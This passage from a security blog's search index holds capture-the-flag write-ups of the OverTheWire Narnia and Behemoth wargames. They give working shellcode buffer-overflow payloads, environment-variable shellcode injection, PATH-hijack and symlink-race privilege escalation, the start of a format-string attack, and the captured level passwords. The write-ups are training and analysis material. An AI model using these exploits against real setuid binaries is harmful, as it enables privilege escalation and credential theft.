                                                                  00000020: d1d7 ffff 0a  Here we can see that local_8 is located at 0xffffd7d1. Subtracting this address by 4 bytes (local_8c address) + 4 bytes (junk) + 4 bytes (shellcode address) + 33 bytes (shellcode[13]), we get the local_8 address as 0xffffd7a4:  \&gt;&gt;&gt; hex(0xffffd7d1\-(4+4+4+33))  '0xffffd7a4'To calculate the address of the shellcode, we add 20 to the local_8 address to account for 20 A’s + 4 (address of local_8) + 4 (junk) + 4 (address of shellcode):  \&gt;&gt;&gt; hex(0xffffd7a4+20+4+4+4)  '0xffffd7c4'Therefore, the address of the shellcode is at 0xffffd7c4. Finally, the payload can be passed as the argument:  narnia8@narnia:/narnia$ ./narnia8 $(python -c "print 'A'*20+'\\xa4\\xd7\\xff\\xff'+'\\x90'*  4+'\\xc4\\xd7\\xff\\xff'+'\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f  \\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80'")                AAAAAAAAAAAAAAAAAAAAj                      XRfh-pRjhh/bash/binRQS  bash-4.4$ whoami  narnia9  bash-4.4$ cat /etc/narnia_pass/narnia9  eiL5fealaeSource Code  #include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;string.h&gt;  // gcc's variable reordering messed things up  // to keep the level in its old style i am  // making "i" global until i find a fix  // -morla  int i;void func(char *b){       char *blah=b;       char bok[20];       //int i=0;       memset(bok, '\\0', sizeof(bok));       for(i=0; blah[i] != '\\0'; i++)                 bok[i]=blah[i];       printf("%s\\n",bok);  }    int main(int argc, char **argv){       if(argc &gt; 1)                 func(argv[1]);       else       printf("%s argument\\n", argv[0]);       return 0;  }Looking at the code, the assumption that the while loop in func found by Ghidra is actually a for loop proved to be correct.ConclusionBinaries with setuid permissions must be carefully examined before other users are given execute permissions. Every binary was vulnerable to exploitation using well-known techniques, among them being re2libc, format string exploitation, and shellcode injection. The following remediations will strengthen the security of every tested binary:      Perform boundary checks before passing user input into functions    Almost every binary outlined in this report was vulnerable due to failure of checking boundaries      Sensitive memory addresses were overwritten allowing ret2libc among other attacks        Unnecessary disabling NX bit        The NX bit was unnecessarily disabled for multiple binaries resulting in shellcode injection        Untrusted user input was directly passed to functions    Two out of nine binaries (namely Narnia 5 and Narnia 7) passed unsanitized user input directly to snprintf without boundary checksSETUID permissions for every binary tested in this report should be removed immediately until the remediations outlined above are observed.[1] https://github.com/pwndbg/pwndbg [2] https://ghidra-sre.org/ [3] https://owasp.org/www-community/attacks/Buffer_Overflow_via_Environment_Variables [4] https://www.tutorialspoint.com/c_standard_library/c_function_getenv.htm [5] http://shell-storm.org/shellcode/files/shellcode-827.php [6] http://shell-storm.org/shellcode/files/shellcode-606.php [7] https://avinetworks.com/wp-content/uploads/2020/06/buffer-overflow-diagram.png[8] https://i.stack.imgur.com/Ewkn1.png [9] http://shell-storm.org/shellcode/files/shellcode-606.php[10] https://en.wikipedia.org/wiki/Bounds_checking [11] https://stackoverflow.com/questions/1270387/are-snprintf-and-friends-safe-to-use#:~:text=It%20is%20safe%20as%20you,correct%20length%20for%20the%20buffer.&amp;text=snprintf%20does%20guarantee%20that%20the,does%20not%20guarantee%20null%2Dtermination.[12] https://en.wikipedia.org/wiki/Return-to-libc_attack [13] http://shell-storm.org/shellcode/files/shellcode-606.php",
      "image": "/images/0xd4y-logo-gray.png"
    } ,
  
    {
      "title"    : "Behemoth Writeup",
      "category" : "",
      "tags"     : "Format String, Shellcode Filter Bypass, PATH privesc, Buffer Overflow, Shellcode, and Binary Exploitation",
      "url"      : "/2021/04/20/Behemoth-Writeup/",
      "date"     : "Apr 20, 2021",
      "content"  : "This report can be read both on this site, and as its original report form. It is highly recommended that you read the original report form instead because it is better formatted.BehemothA look into the exploitation of vulnerable binaries   0xd4yApril 20, 20210xd4y WriteupsLinkedIn: https://www.linkedin.com/in/segev-eliezer/ Email: 0xd4yWriteups@gmail.comWeb: https://0xd4y.github.io/ Table of ContentsExecutive Summary        3Attack Narrative        4Behemoth 0        4Behemoth 1        5Method 1        8POC        9Shellcode Execution        9Method 2        12Behemoth 2        13Binary Analysis        13Behavior        13Ghidra        13Binary Exploitation        15Path Privesc (Touch)        15Path Privesc (Cat)        15Symbolic Link        16Behemoth 3        17Binary Analysis        17Behavior        17Ghidra        18Discovery of Format String Vulnerability        19Memory Addresses of Useful Functions        19Overwriting Puts        20Constructing Payload With GDB        20Exploit Development        21Controlling Puts Address        22Popping a Shell        24Behemoth 4        25Binary Analysis        26Behavior        26Ghidra        26Binary Exploitation        27Symbolic Link Attack        27Behemoth 5        28Binary Analysis        28Ghidra        28Catching Behemoth6 Password Through UDP        31Behemoth 6        31Ghidra        32Abusing popen()        33Behemoth 7        34Binary Analysis        34Behavior        34Ghidra        35Constructing Payload        37Calculating EIP Offset        37Shellcode Address        38Final Payload        39Conclusion        41Executive SummaryIn contrast to Narnia, the source code for each binary is not given.  Nevertheless, all eight binaries were successfully analyzed and exploited. Attack techniques such as shellcode injection, format string exploitation, and path privilege escalation are covered in this report. Some binaries were more of a reverse engineering exercise (Behemoth 5 and Behemoth 6 for example) while others typically involved buffer overflow and format string exploits such as in Behemoth 7, a challenge which showcases an interesting way of bypassing shellcode filters.The binaries were mainly vulnerable due to a lack of boundary checks and input validation. It is critical that the SETUID bits of these binaries are removed until the remedies in the Conclusion section are observed. Below is the full listing of all passwords obtained from the compromised users:UsernamePasswordbehemoth0behemoth0behemoth1aesebootivbehemoth2eimahquuofbehemoth3nieteidielbehemoth4ietheisheibehemoth5aizeeshingbehemoth6mayiroechebehemoth7baquoxuafobehemoth8pheewij7AeAttack NarrativeThe credentials to the first user, behemoth0, was given as behemoth0 (the credentials are behemoth0:behemoth0). The ssh service is open on port 2221, and this ssh session provided the means for allowing the analysis of the binaries discussed in this report.Behemoth 0Running the strings command on the binary reveals some interesting strings:However, trying any of these potential passwords results in an “Access denied..” message. Using ltrace, a library call tracer, the system calls of the binary can be seen upon inputting a password:  ┌─[✗]─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/0]  └──╼ $ltrace ./behemoth0  __libc_start_main(0x80485b1, 1, 0xffbafd14, 0x8048680 &lt;unfinished ...&gt;printf("Password: ")                                     = 10  __isoc99_scanf(0x804874c, 0xffbafc0b, 0xf7f3e000, 0Password: 123  )     = 1  strlen("OK^GSYBEX^Y")                                    = 11  strcmp("123", "eatmyshorts")                             = -1  puts("Access denied.."Access denied..  )                                  = 16  +++ exited (status 0) +++The binary is comparing the user input to the secret password by using the strcmp (string compare) function. Trying out the eatmyshorts password, we are given access to the next level:Behemoth 1Now with a shell as the behemoth1 user, we can maintain persistence by grabbing the password from /etc/behemoth_pass directory.Running the behemoth1 binary, the following output can be seen:After downloading the binary and using ltrace, the following output is found:  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/1]  └──╼ $ltrace ./behemoth1  __libc_start_main(0x804844b, 1, 0xffc01bc4, 0x8048480 &lt;unfinished ...&gt;printf("Password: ")                                     = 10  gets(0xffc01ad5, 0xf7f11080, 0, 0xf7d25b7ePassword: a  )              = 0xffc01ad5  puts("Authentication failure.\\nSorry."Authentication failure.  Sorry.  )                  = 31  +++ exited (status 0) +++This binary is a little bit more secure in the sense that the password is not exposed by the strcmp function. Before trying to reverse engineer this binary, it is important to check for possible buffer overflow vulnerabilities. This can be done by sending a large input as follows:  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/1]  └──╼ $python -c "print 'A'*1000"|xclip -sel clipbehemoth1@behemoth:/behemoth$ ./behemoth1  Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  Authentication failure.  Sorry.  Segmentation faultThe program was successfully crashed by sending a large input as can be seen from the “Segmentation fault” error. This is a strong indicator of a potential buffer overflow vulnerability.  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/1]                                                                                                                    └──╼ $gdb ./behemoth1  -q                                                                                                                                                      pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.                                                                                                                  pwndbg: created $rebase, $ida gdb functions (can be used with print/break)                                                                                                    Reading symbols from ./behemoth1...                                                                                                                                            (No debugging symbols found in ./behemoth1)                                                                                                                                    pwndbg&gt; r &lt; &lt;(cyclic 1000)                                                                                                                                                    Starting program: /home/0xd4y/business/other/overthewire/behemoth/1/behemoth1 &lt; &lt;(cyclic 1000)                                                                                Password: Authentication failure.                                                                                                                                              Sorry.                                                                                                                                                                                                                                                                                                                                                     Program received signal SIGSEGV, Segmentation fault.                                                                                                                          0x61617361 in ?? ()                                                                                                                                                          Note how the cyclic function was used to help determine where the offset isThe output confirms the suspicion that this binary is vulnerable to a buffer overflow attack. Looking at the return address at the bottom of the result, it can be seen that the binary is looking for an address of 0x61617361. The offset can be calculated using the cyclic -l operation as follows:  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/1]  └──╼ $cyclic -l 0x61617361  71The offset is the amount of bytes that a binary can take before overwriting the instruction pointer (the register which points to which part of the code should be executed next). Observe from the hex addresses that this is a 32 bit binary. The file command can be used as well to verify this:  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/1]  └──╼ $file behemoth1  behemoth1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7e13226f3c05594af2cf29fe34c92cc55047eb94, not strippedThis binary is not stripped meaning the debug symbols[1] of the binary can be gathered. Additionally, the binary’s security can be analyzed with the checksec command:Seeing as this binary has NX (non-execute) disabed, shellcode can be written into memory and the binary will execute it (provided that the payload is formatted correctly). With the knowledge that arbitrary code can be executed and that the instruction pointer can be controlled, the binary can be exploited by using shellcode.  pwndbg&gt; r &lt; &lt;(python -c "print 'A'*71+'B'*4")                                            Starting program: /home/0xd4y/business/other/overthewire/behemoth/1/behemoth1 &lt; &lt;(python -c "print 'A'*71+'B'*4")  Password: Authentication failure.                                                      Sorry.                                                                                                                                                                                                                                                                                                                                                     Program received signal SIGSEGV, Segmentation fault.  0x42424242 in ?? ()Note how the return address was successfully controlled (42 is the hex value for B).For the sake of learning more about binary exploitation, I will go over two different methods of pwning:                                                                                                                                                     Method 1We can create a payload that has the following structure:JUNK_BYTES + ADDRESS_TO_SHELLCODE_ + NOP_SLED + SHELLCODEThen this payload can be inputted to the binary and it will execute the shellcode. There are many different kinds of shellcodes that can be used, however a simple /bin/sh shellcode[2], which will return a shell upon execution. The next task is to determine where the address of the shellcode will be.POC  pwndbg&gt; r &lt; &lt;(python -c "print 'A'*71+'B'*4+'C'*23")  pwndbg&gt; x/100x $esp\-100                                                                                                                                                        0xffffcfdc:     0x00000000      0xf7fa6000      0xf7fa6000      0xffffd038              0xffffcfec:     0x08048474      0x0804850c      0x41414180      0x41414141              0xffffcffc:     0x41414141      0x41414141      0x41414141      0x41414141              0xffffd00c:     0x41414141      0x41414141      0x41414141      0x41414141              0xffffd01c:     0x41414141      0x41414141      0x41414141      0x41414141              0xffffd02c:     0x41414141      0x41414141      0x41414141      0x41414141              0xffffd03c:     0x42424242      0x43434343      0x43434343      0x43434343                                                                                                    0xffffd04c:     0x43434343      0x43434343      0x00434343      0xf7fcb410                                                                                                  Note A is 41, B is 42, and C is 43 in hexLooking at the output of the esp register, the register responsible for pointing to the top of the stack, observe that the shellcode (in this case 43) will start at the second column of 0xffffd03c. Thus the address of the shellcode will be 0xffffd03c + 4 (each column corresponds to 4 bytes) which equals 0xffffd040.Shellcode ExecutionWith the knowledge of how buffer overflow attacks work, we can now continue with exploiting the behemoth binary on the target system.  (gdb) disass main                                                                      Dump of assembler code for function main:                                                0x0804844b &lt;+0&gt;:     push   %ebp                                                      0x0804844c &lt;+1&gt;:     mov    %esp,%ebp                                                  0x0804844e &lt;+3&gt;:     sub    $0x44,%esp                                                0x08048451 &lt;+6&gt;:     push   $0x8048500                                               0x08048456 &lt;+11&gt;:    call   0x8048300 &lt;printf@plt&gt;                        0x0804845b &lt;+16&gt;:    add    $0x4,%esp                                                  0x0804845e &lt;+19&gt;:    lea    -0x43(%ebp),%eax                                          0x08048461 &lt;+22&gt;:    push   %eax                                                      0x08048462 &lt;+23&gt;:    call   0x8048310 &lt;gets@plt&gt;                                      0x08048467 &lt;+28&gt;:    add    $0x4,%esp                                                  0x0804846a &lt;+31&gt;:    push   $0x804850c                                               0x0804846f &lt;+36&gt;:    call   0x8048320 &lt;puts@plt&gt;                                      0x08048474 &lt;+41&gt;:    add    $0x4,%esp                                                  0x08048477 &lt;+44&gt;:    mov    $0x0,%eax                                                  0x0804847c &lt;+49&gt;:    leave                                                            0x0804847d &lt;+50&gt;:    ret                                                            End of assembler dump.                                                                  (gdb) b *0x08048462                                                                    Breakpoint 1 at 0x8048462                                                              (gdb) r &lt; &lt;(python -c "print 'A'*71 +'\\xc0\\xd5\\xff\\xff'+'\\x90'*100+'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'")  Starting program: /behemoth/behemoth1 &lt; &lt;(python -c "print 'A'*71 +'\\xc0\\xd5\\xff\\xff'+'\\x90'*100+'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe  1\\xb0\\x0b\\xcd\\x80'")Breakpoint 1, 0x08048462 in main ()(gdb) sSingle stepping until exit from function main,                                        which has no line number information.                                                Password: Authentication failure.                                                    Sorry.                                                                                0xffffd5c0 in ?? ()                                                            Now that the binary’s memory has been flooded, the ESP register can be checked to see which address marks the start of the shellcode:  (gdb) x/100x $esp-1000xffffd55c:     0x00000000      0x00000001      0xf7fc5000      0xffffd5b80xffffd56c:     0x08048474      0x0804850c      0x41414154      0x414141410xffffd57c:     0x41414141      0x41414141      0x41414141      0x414141410xffffd58c:     0x41414141      0x41414141      0x41414141      0x414141410xffffd59c:     0x41414141      0x41414141      0x41414141      0x414141410xffffd5ac:     0x41414141      0x41414141      0x41414141      0x414141410xffffd5bc:     0xffffd5c0      0x90909090      0x90909090      0x909090900xffffd5cc:     0x90909090      0x90909090      0x90909090      0x909090900xffffd5dc:     0x90909090      0x90909090      0x90909090      0x909090900xffffd5ec:     0x90909090      0x90909090      0x90909090      0x909090900xffffd5fc:     0x90909090      0x90909090      0x90909090      0x909090900xffffd60c:     0x90909090      0x90909090      0x90909090      0x909090900xffffd61c:     0x90909090      0x90909090      0x6850c031      0x68732f2f0xffffd62c:     0x69622f68      0x50e3896e      0xb0e18953      0x0080cd0b0xffffd63c:     0x08048480      0x080484e0      0xf7fe9070      0xffffd64c0xffffd64c:     0xf7ffd920      0x00000001      0xffffd7a5      0x00000000          The value for the eip register can be found at 0xffffd5bc. It is then followed by a sequence of NOPs. The shellcode is most likely the one at 0xffffd61c + 8. Thus, the return address will most likely work if given a value between 0xffffd5bc + 4 and  0xffffd61c + 8.  behemoth1@behemoth:~$ python -c "print 'A'*71 +'\\xd0\\xd5\\xff\\xff'+'\\x90'*100+'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'"|/behemoth/behemoth1  Password: Authentication failure.  Sorry.  Illegal instructionIt is imperative to note that upon piping this malicious payload into the binary, we did not receive a Segmentation Fault error, rather an Illegal Instruction error was printed out. This error is present whenever a program jumps to an address with code that cannot be interpreted either because it is plain data or is an ambiguous part of an opcode (that’s why this error is also called an illegal opcode error). This is an indication that our payload most likely works, however the return address needs to be tweaked so as to point to an address in memory that will correctly interpret our shellcode. After tweaking with the address for a bit by slightly decrementing it, the following is found:  behemoth1@behemoth:~$ python -c "print 'A'*71 +'\\xbb\\xd5\\xff\\xff'+'\\x90'*100+'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'"|/behemoth/behemoth1  Password: Authentication failure.  Sorry.Note how now there is no error displayedThe program is most likely executing the shellcode, but a shell was not received. This is most likely due to the stdin and stdout being tied to this process. By appending ;cat - to the end of the command to output stdin, the exploit works as intended:  behemoth1@behemoth:~$ (python -c "print 'A'*71 +'\\xbb\\xd5\\xff\\xff'+'\\x90'*100+'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'";cat -)|/behemoth/behemoth1  Password: Authentication failure.  Sorry.  whoami  behemoth2  cat /etc/behemoth_pass/behemoth2  eimahquuofMethod 2Alternatively, it is possible to exploit this binary by using environment variables.  behemoth1@behemoth:/tmp/dfghoifdghfoidghiodfh$ export EGG=$(python -c 'print "\\x90\\x90\\x90\\x90\\x90\\x90\\x6a\\x31\\x58\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\x31\\xc0\\x50\\x6  8\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x54\\x5b\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80"')We can create a c file which will take our environment variable to use for the targeted binary.  #include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;string.h&gt;    int main(int argc, char *argv[]) {       if(argc &lt; 3) {                   printf("Usage: %s &lt;environment variable&gt; &lt;target program name&gt;\\n", argv[0]);                           exit(0);                                 }           char *ptr = getenv(argv[1]); /* get env var location */               ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */                   printf("%s will be at %p\\n", argv[1], ptr);  }After compiling the program with gcc, the program can be executed so as to inject the shellcode into the environment variable, and find where it is located in memory:  behemoth1@behemoth:/tmp/dfghoifdghfoidghiodfh$ gcc -m32 find_addr.c -o find_addrbehemoth1@behemoth:/tmp/dfghoifdghfoidghiodfh$ ./find_addr EGG /behemoth/behemoth1  EGG will be at 0xffffddd3Seeing that the shellcode is at 0xffffddd3,the payload can be constructed to point to this address:  behemoth1@behemoth:/tmp/dfghoifdghfoidghiodfh$ (python -c "print 'A'*71+'\\xd3\\xdd\\xff\\xff'";cat -)|/behemoth/behemoth1  Password: Authentication failure.  Sorry.  whoami  behemoth2Behemoth 2As the behemoth2 user, the behemoth2 binary can now be executed.Binary AnalysisBehaviorAfter executing the binary, the program simply touches a file and then hangs:  behemoth2@behemoth:/behemoth$ ./behemoth2  touch: cannot touch '30233': Permission deniedSeeing as this binary performs a system function, there is most likely a system function being called within the program.GhidraAfter downloading the binary onto the attack box, this binary can be further analyzed within Ghidra:  undefined4 main(void)    {   uint uVar1; __uid_t _Var2; __uid_t _Var3; stat local_90; undefined4 local_2c; undefined local_28; char acStack38 [14]; char *local_18; __pid_t local_14; undefined *local_10;  local_10 = &amp;stack0x00000004; local_14 = getpid(); local_18 = acStack38; sprintf((char *)&amp;local_2c,"touch %d",local_14); uVar1 = lstat(local_18,&amp;local_90); if ((uVar1 &amp; 0xf000) != 0x8000) {     unlink(local_18);   _Var2 = geteuid();   _Var3 = geteuid();   setreuid(_Var3,_Var2);   system((char *)&amp;local_2c); }   sleep(2000); local_2c = 0x20746163; local_28 = 0x20; _Var2 = geteuid(); _Var3 = geteuid(); setreuid(_Var3,_Var2); system((char *)&amp;local_2c); return 0;  }Toward the top of the program, the sprintf function is called in which the string “touch %d” is passed into the local_2c variable (with %d corresponding to the id of this process). It is essential to note that touch is declared without using its full path (i.e. /usr/bin/touch).Furthermore, two system calls are executed. One is within the if statement and one is outside the if statement following a sleep of 2000 seconds. This sleep call is responsible for the hanging that was experienced after executing the binary. Therefore, the first system call is to the touch command. The second system call again uses the local_2c variable, but only after it is initialized to 0x20746163. Converting 20 74 61 63 into ascii results in “ tac”.  behemoth2@behemoth:/behemoth$ file behemoth2  behemoth2: setuid ELF 32\-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87daf01f3941b5f8f815d758ed9e90589a9d315c, not strippedSeeing as this binary is in LSB format, the “ tac” string should actually be read backwards, revealing that this is “cat “. Thus, the program first touches the a file then cats it after 2000 seconds.Binary ExploitationThis binary has multiple vulnerabilities, and each method of exploitation is described below:Path Privesc (Touch)Seeing as this binary executes the touch command without using its full path, a file called touch can be created which executes the /bin/bash command:  behemoth2@behemoth:/tmp/pathprivesc$ echo “/bin/bash” &gt; touch  behemoth2@behemoth:/tmp/pathprivesc$ chmod 777 touchAfter creating this file with the aforementioned contents, the PATH environment variable can be updated to prioritize the current directory over all other directories:  behemoth2@behemoth:/tmp/pathprivesc$ export PATH=.:$PATH  behemoth2@behemoth:/tmp/pathprivesc$ which touch  ./touchNow, upon executing the behemoth2 binary, the touch command will be called to the newly created touch file:  behemoth2@behemoth:/tmp/pathprivesc$ /behemoth/behemoth2  behemoth3@behemoth:/tmp/pathprivesc$ whoami  behemoth3Path Privesc (Cat)The same methodology used for the touch command can be used for the cat command. As seen from the analysis, the cat command is also being called without using its full path:  behemoth2@behemoth:/tmp/pathprivesc$ echo “/bin/bash” &gt; cat  behemoth2@behemoth:/tmp/pathprivesc$ chmod 777 cat  behemoth2@behemoth:/tmp/pathprivesc$ export PATH=.:$PATH  behemoth2@behemoth:/tmp/pathprivesc$ /behemoth/behemoth2  touch: cannot touch '29678': Permission denied  behemoth3@behemoth:/tmp/pathprivesc$ whoamibehemoth3This way of escalating privileges takes longer than the aforementioned one because a wait of 2000 seconds is necessary before cat gets executed.Symbolic LinkThis binary could still be abused even if the cat and touch commands were executed using their full paths. A symbolic link to the behemoth3 password file can be created so that the cat command reads the password of the behemoth3 user. The name of the file must correspond to the id of the process. When the cat command reads the contents of the created file, it will be pointed to the credentials of behemoth3, and the password of the user would be printed to stdout:behemoth2@behemoth:/tmp/behemoth2$ /behemoth/behemoth2touch: cannot touch ‘10216’: Permission deniedOnce the behemoth2 binary was executed, an error occurred stating that the file 10216 was attempted to be created, but the behemoth3 user does not have the permissions to create this file under a directory owned by behemoth2. The name of the file is leaked, meaning that a symbolic link named after this file can be created before the cat command gets executed (the time limit for creating this file is 2000 seconds).After logging into another session as the behemoth2 user, a symbolic link corresponding to 10216 can be created:  behemoth2@behemoth:/tmp/behemoth2$ ln -s /etc/behemoth_pass/behemoth3 10216  behemoth2@behemoth:/tmp/behemoth2$ ls -la 10216 lrwxrwxrwx 1 behemoth2 root 28 May 15 06:53 10216 -&gt; /etc/behemoth_pass/behemoth3Note that this file is pointing to the password of the behemoth3 user.After waiting for 2000 seconds, the password of the behemoth3 user gets printed out:  behemoth2@behemoth:/tmp/behemoth2$ /behemoth/behemoth2  touch: cannot touch '10216': Permission denied  nieteidielBehemoth 3After successfully abusing the behemoth2 binary, the next challenge is behemoth3.Binary AnalysisWe can begin the analysis by downloading the target binary on the attack box and running the checksec command against it:  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/3]  └──╼ $checksec behemoth3  [*] '/home/0xd4y/business/other/overthewire/behemoth/3/behemoth3'   Arch:     i386-32-little   RELRO:    No RELRO   Stack:    No canary found   NX:       NX disabled   PIE:      No PIE (0x8048000)   RWX:      Has RWX segments  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/3]  └──╼ $file behemoth3behemoth3: ELF 32\-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4c39bd8f6f54ab267675a6c5e2186d65e1eb4821, not strippedFrom the results of checksec and file, note that the binary essentially has no protection on it. Everything that could possibly hinder debug analysis on the program is disabled. Additionally, the file is not stripped, so debug symbols will be available.BehaviorWhen executing the program, we are asked to provide an identification:  behemoth3@behemoth:/behemoth$ ./behemoth3  Identify yourself: This is a test  Welcome, This is a test    aaaand goodbye again.After inputting a large amount of A’s (in this example 500 A’s were used), the program prints out a minimized version of the string:  behemoth3@behemoth:/behemoth$ ./behemoth3  Identify yourself: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  aaaand goodbye again.Despite 500 A’s being passed into the buffer, only 200 A’s were printed out. Ghidra can be implemented to further help in understanding how this binary is working:GhidraGhidra translated the assembly code of the main function into the following:  undefined4 main(void){ char local_cc [200];  printf("Identify yourself: ");   fgets(local_cc,200,stdin); printf("Welcome, "); printf(local_cc); puts("\\naaaand goodbye again."); return 0;  }A variable called local_cc of type char is declared and is allocated 200 bytes. Afterwards, the fgets function is used to allow up to 200 bytes to be passed to the local_cc variable, and therefore this binary is not vulnerable to a buffer overflow exploit. However, the user input (local_cc) is passed directly to the printf function without any sort of sanitization. Consequently, the program is likely vulnerable to a string format exploit[3].Discovery of Format String VulnerabilityThis can be verified by passing a format string into the local_cc variable:  behemoth3@behemoth:/behemoth$ ./behemoth3  Identify yourself: %x  Welcome, a7825    aaaand goodbye again.Despite inputting %x into the buffer, an output of a7825 was printed (note that %x is a format string to specify an unsigned int as a hexadecimal number[4]). When the binary is given a format string as an input, it starts to leak memory from the stack.This vulnerability can be abused to overwrite memory by using the %n format string which writes the number of characters written into a pointer parameter. If the pointer parameter is an address that the binary uses, then the memory address of the function can be overwritten to point to shellcode. This can result in the execution of arbitrary code.Memory Addresses of Useful FunctionsThe objdump command can be utilized to determine the addresses of functions used by the binary:  behemoth3@behemoth:/behemoth$ objdump -R ./behemoth3    ./behemoth3:     file format elf32-i386    DYNAMIC RELOCATION RECORDS  OFFSET   TYPE              VALUE  08049794 R_386_GLOB_DAT    __gmon_start__  080497c0 R_386_COPY        stdin@@GLIBC_2.0  080497a4 R_386_JUMP_SLOT   printf@GLIBC_2.0  080497a8 R_386_JUMP_SLOT   fgets@GLIBC_2.0  080497ac R_386_JUMP_SLOT   puts@GLIBC_2.0  080497b0 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.From the output, there are a total of three functions displayed (printf, fgets, and puts). However, the fgets and printf functions should not be overwritten, as these functions must work properly to accept the malicious payload. This leaves the puts function as the only candidate from the objdump output to be overwritten.Overwriting PutsBefore being able to overwrite the memory address of puts, the user input’s location within the stack must first be determined:  